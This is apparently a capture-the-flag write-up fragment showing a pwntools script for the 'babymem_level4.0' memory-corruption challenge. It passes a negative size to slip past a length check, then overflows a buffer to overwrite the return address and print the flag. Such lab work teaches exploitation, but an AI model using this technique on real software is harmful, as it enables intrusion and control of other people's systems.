
### 4.0 - 

```
  GNU nano 4.8                                                                                                       exploit.py                                                                                                        Modified  
#!/usr/bin/python
from pwn import *
context.log_level = 'debug'
p = process("/challenge/babymem_level4.0")
print(p.recvuntil(b'Payload size: '))
p.sendline(b'-1')
p.recvuntil(b'-1 bytes)!\n')
payload = b'a' * 88 + p64(0x4019ef)
p.sendline(payload)
print(p.recvuntil(b'}'))

```

Ez!